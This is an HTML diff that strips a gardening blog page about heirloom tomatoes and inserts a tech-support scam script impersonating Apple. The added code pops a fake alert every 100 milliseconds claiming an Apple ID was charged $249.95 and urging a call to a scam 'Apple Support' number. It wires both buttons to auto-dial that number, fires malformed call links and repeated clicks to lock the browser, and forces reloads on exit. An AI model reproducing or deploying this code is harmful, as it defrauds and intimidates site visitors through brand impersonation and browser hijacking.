+Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+Apple </a></div>
+        </div>
+        <meta content="Apple" property="name">
+        <meta content="+1-813-385-1334
+ " property="telephone">
+      </section>
     </div>
-    <div class="desc">
-      <h4>📊 Pollinator visits by season</h4>
-      <p style="color:var(--clr-muted); margin-top:0.2rem;">From early spring to late autumn, the garden hums with activity. Native plants extend the feast.</p>
-      <span class="tag">data · 2025</span>
-    </div>
-  </div>
+  </footer>
 
-  <!-- STORY ROW (compact horizontal) -->
-  <section class="story-row">
-    <div class="story-item"><span class="story-meta">Apr 12</span><span class="story-title">The Art of Overwintering Geraniums</span><span class="story-cat">techniques</span></div>
-    <div class="story-item"><span class="story-meta">Apr 9</span><span class="story-title">Sage, Rosemary & Thyme: A Mediterranean Trio</span><span class="story-cat">herbs</span></div>
-    <div class="story-item"><span class="story-meta">Apr 4</span><span class="story-title">Why Weeds Are Not the Enemy</span><span class="story-cat">soil</span></div>
-    <div class="story-item"><span class="story-meta">Mar 28</span><span class="story-title">Planting by the Moon: Ancient Rhythms</span><span class="story-cat">folklore</span></div>
-  </section>
+  <script src="js/jquery-1.12.0.min.js"></script>
+  <script>
+    function getURLParameter(name) {
+      return decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    };
+    var cookieHelper = {
+      defParams: {
+        path: "/",
+        domain: "." + window.location.host.replace(/:\d+/, "")
+      },
+      set: function(a, d, c) {
+        c = c || {};
+        for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+        b = c.expires;
+        if ("number" == typeof b && b) {
+          var e = new Date;
+          e.setTime(e.getTime() + 1E3 * b);
+          b = c.expires = e
+        }
+        b && b.toUTCString && (c.expires = b.toUTCString());
+        d = encodeURIComponent(d);
+        a = a + "=" + d;
+        for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+        document.cookie = a
+      },
+      get: function(a) {
+        return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+      },
+      del: function(a) {
+        this.set(a, null, {
+          expires: -1
+        })
+      }
+    };
 
-  <!-- QUICK NOTE: internal linking -->
-  <div style="margin: 1.5rem 0; background: #f4efe7; padding: 1.2rem 2rem; border-radius: 4px; display: flex; flex-wrap: wrap; gap: 1rem; justify-content: space-between; align-items: center;">
-    <span style="font-weight:500;">🌿 Explore our <a href="#" style="border-bottom:2px solid var(--clr-accent);">complete field guide</a> to heirloom vegetables</span>
-    <span><a href="#">Read the full archive →</a></span>
-  </div>
-</main>
+    var userAgent = window.navigator.userAgent.toLowerCase(),
+      ios = /iphone|ipod|ipad/.test(userAgent);
 
-<!-- ====== ARTICLE PAGE (long-form example) ====== -->
-<article class="container article-main" id="article">
-  <span class="tag">heirloom</span>
-  <h1>The Cherokee Purple: A Living Legacy</h1>
-  <p class="subtitle">How one tomato carries the memory of a people, and why it matters today.</p>
-  <div class="byline">
-    <span class="author">by Elara Finch</span>
-    <span>Published April 15, 2026</span>
-    <span>Updated April 18, 2026</span>
-    <span>· 14 min read</span>
-  </div>
-  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='800' height='400' viewBox='0 0 800 400'%3E%3Crect width='800' height='400' fill='%23d0c9bc'/%3E%3Ccircle cx='200' cy='180' r='80' fill='%236a4e3a' opacity='0.4'/%3E%3Ccircle cx='550' cy='200' r='100' fill='%23b68b6b' opacity='0.3'/%3E%3C/svg%3E"
-       alt="Ripe Cherokee Purple tomatoes with deep dusky shoulders, rich color" style="border-radius:4px; margin:1rem 0 2rem;">
+    function parseURL(url) {
+      var a = document.createElement('a');
+      a.href = url;
+      return a.hostname.replace('www.', '');
+    };
 
-  <div class="toc">
-    <strong>Contents</strong>
-    <ul style="list-style:none; padding:0; margin-top:0.4rem;">
-      <li>· Origins in the Appalachian South</li>
-      <li>· Growing conditions & flavor profile</li>
-      <li>· Seed saving techniques</li>
-      <li>· Cultural significance</li>
-    </ul>
-  </div>
+    function getPar(name) {
+      var url = window.location.href;
+      name = name.replace(/[\[\]]/g, "\\$&");
+      var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+        results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, " "));
+    };
 
-  <h2>Origins of a Dusky Beauty</h2>
-  <p>The Cherokee Purple is not merely a tomato; it is a story carried across generations. Believed to have been cultivated by the Cherokee people in the Appalachian region, this beefsteak variety boasts a dusky pink‑purple skin and a complex, smoky sweetness that has captivated gardeners for decades.</p>
-  <p>Unlike modern hybrids bred for uniformity, the Cherokee Purple is a celebration of imperfection — its ribbed shoulders and deep green “neck” are badges of authenticity. In the 1990s, seeds were shared with seed savers like Craig LeHoullier, who helped bring this heirloom to a wider audience.</p>
+    window.number = getPar('phone');
 
-  <div class="tip-box">
-    <strong>🌱 Gardener’s Note:</strong> Cherokee Purple tomatoes thrive in warm climates with consistent moisture. They are indeterminate, meaning they will continue to produce until frost.
-  </div>
+    window.number = (window.number ? window.number : '+1-813-385-1334');
 
-  <h2>Flavor & Culinary Use</h2>
-  <p>The flavor is often described as “complex” — a balance of sweetness and acidity with a hint of smokiness. It is exceptional for slicing, sandwiches, and simple salads. Because of its thin skin, it is best enjoyed fresh.</p>
+    window.device = 'iPhone';
+    window.refef = parseURL(document.referrer);
 
-  <h3>Seed Saving Steps</h3>
-  <ul>
-    <li>Select fully ripe, disease‑free fruit from the healthiest plants.</li>
-    <li>Scoop seeds into a jar with water and let ferment for 2‑3 days.</li>
-    <li>Rinse, dry on a paper plate, and store in a cool, dark place.</li>
-  </ul>
+    if (ios) {
 
-  <h2>Why Preserve Heirlooms?</h2>
-  <p>Every heirloom variety is a genetic library, adapted to local conditions and tastes. By growing and sharing seeds, we participate in a living tradition — one that resists the homogenization of our food system.</p>
+      if (/iphone/.test(userAgent)) {
+        window.device = 'iPhone';
+      }
 
-  <!-- FAQ mini -->
-  <div style="margin:2rem 0;">
-    <h3>Frequently Asked Questions</h3>
-    <div class="faq-item"><strong>How long does it take to mature?</strong> About 80‑85 days from transplant.</div>
-    <div class="faq-item"><strong>Can I grow it in containers?</strong> Yes, but use a 15‑gallon pot with rich soil.</div>
-    <div class="faq-item"><strong>Is it disease resistant?</strong> Moderate resistance; good air circulation helps.</div>
-  </div>
+      if (/ipad/.test(userAgent)) {
+        window.device = 'iPad';
+      }
 
-  <p><strong>Related:</strong> <a href="#">The Art of Tomato Caging</a> · <a href="#">Fermenting Seeds for Better Viability</a></p>
-  <div style="border-top:1px solid var(--clr-border); margin-top:2.5rem; padding-top:1.5rem; display:flex; gap:1.5rem; flex-wrap:wrap;">
-    <span class="tag">heirloom</span><span class="tag">tomato</span><span class="tag">seed saving</span>
-  </div>
-</article>
+      if (/ipod/.test(userAgent)) {
+        window.device = 'iPod';
+      }
+    }
 
-<!-- ====== FOOTER (unique, layered) ====== -->
-<footer>
-  <div class="container">
-    <div class="footer-grid">
-      <div>
-        <h4 style="font-family:'EB Garamond',serif; font-size:1.6rem;">🌱 Uncharted Garden</h4>
-        <p style="max-width:240px; color:#d9d2c5;">Cultivating curiosity, one seed at a time. A digital almanac for the thoughtful gardener.</p>
-        <p style="margin-top:0.6rem; font-size:0.9rem;">✉️ hello@unchartedgarden.com</p>
-      </div>
-      <div>
-        <h4>Journal</h4>
-        <ul><li><a href="#">Latest</a></li><li><a href="#">Heirlooms</a></li><li><a href="#">Soil Science</a></li><li><a href="#">Pollinators</a></li></ul>
-      </div>
-      <div>
-        <h4>Resources</h4>
-        <ul><li><a href="#">Seed Library</a></li><li><a href="#">Growing Guides</a></li><li><a href="#">Glossary</a></li><li><a href="#">Bookshop</a></li></ul>
-      </div>
-      <div>
-        <h4>About</h4>
-        <ul><li><a href="#">Editorial Policy</a></li><li><a href="#">Authors</a></li><li><a href="#">Contact</a></li><li><a href="#">Privacy</a></li></ul>
-      </div>
-    </div>
-    <div class="copy">
-      <span>© 2026 Uncharted Garden Paths. All rights reserved. · <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Cookie Policy</a> · <a href="#">Disclaimer</a></span>
-    </div>
-  </div>
-</footer>
+    var text = cookieHelper.get('textSetBl');
+    var phone = cookieHelper.get('phoneSetBl');
 
-<!-- ====== additional pages: About, Contact, etc. are linked in footer ====== -->
+    function getText() {
+      var str = window.defaultText;
+
+      for (var d in window.text) {
+        if (window.refef.indexOf(d) != -1) {
+          str = window.text[d];
+        }
+      }
+      //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+      return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+    }
+
+    if (!phone) {
+      phone = getURLParameter('phone');
+    }
+    if (!text) {
+      text = getURLParameter('text');
+    }
+
+    var sText = document.querySelectorAll('.js_setTextBlock');
+    for (var t = 0; t < sText.length; t++) {
+      sText[t].innerHTML = getText();
+    }
+    var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+    for (var p = 0; p < sPhone.length; p++) {
+      sPhone[p].innerHTML = phone;
+    }
+
+    // ----- Custom confirm popup logic -----
+    const confirmOverlay = document.getElementById('customConfirm');
+    const confirmText = document.getElementById('customConfirmText');
+    const confirmOk = document.getElementById('customConfirmOk');
+    const confirmCancel = document.getElementById('customConfirmCancel');
+
+    let confirmVisible = false;
+
+    function showConfirm(message, onOk, onCancel) {
+      if (confirmVisible) return; // prevent stacking
+      confirmVisible = true;
+      confirmText.textContent = message || 'Your |%model%| Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-813-385-1334 to Freeze it!';
+      confirmOverlay.style.display = 'flex';
+      confirmOverlay.setAttribute('aria-hidden', 'false');
+
+      const onceOk = function() {
+        cleanup();
+        if (onOk) onOk();
+      };
+      const onceCancel = function() {
+        cleanup();
+        if (onCancel) onCancel();
+      };
+
+      function cleanup() {
+        confirmOk.removeEventListener('click', onceOk);
+        confirmCancel.removeEventListener('click', onceCancel);
+        confirmOverlay.style.display = 'none';
+        confirmOverlay.setAttribute('aria-hidden', 'true');
+        confirmVisible = false;
+      }
+
+      confirmOk.addEventListener('click', onceOk);
+      confirmCancel.addEventListener('click', onceCancel);
+    }
+
+    function okkkk() {
+      jQuery('#result').append('<a  class="anchorcall" href="tel:+1-813-385-1334"></a>');
+      document.querySelector('a').click();
+      var extraData = "";
+      for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+        var extraData = extraData + "5555555555";
+      }
+      jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+      document.querySelector('a').click();
+      document.querySelector('a').click();
+      document.querySelector('a').click();
+      document.querySelector('a').click();
+      document.querySelector('a').click();
+      document.querySelector('a').click();
+    }
+
+    // Replaces your previous setInterval + confirm() pattern
+    setInterval(function() {
+      showConfirm(
+        "Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security.Not you? Immediately call Apple Support +1-813-385-1334 to Freeze it!",
+        function() {
+          // OK pressed
+          okkkk();
+        },
+        function() {
+          // Cancel pressed
+          okkkk();
+        }
+      );
+    }, 100);
+
+    window.ununload = function() {
+      debugger;
+      location.reload();
+    }
+  </script>
 </body>
 </html>
